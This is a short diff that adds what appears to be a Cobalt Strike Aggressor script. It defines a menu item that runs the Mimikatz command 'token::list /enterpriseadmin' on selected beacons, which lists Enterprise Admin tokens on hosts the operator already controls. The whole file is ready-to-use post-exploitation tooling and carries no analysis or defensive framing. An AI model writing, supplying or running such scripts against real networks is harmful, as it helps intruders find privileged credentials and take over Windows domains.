@@ -1,0 +1,11 @@
+item "List Enterprise Admin Tokens"{
+	local('$bid');
+		foreach $bid ($1){
+			listeatokens($bid);
+		}
+	}
+	
+#Mimikatz List Enterprise Admin Tokens
+sub listeatokens{
+bmimikatz($1, "token::list /enterpriseadmin");
+}
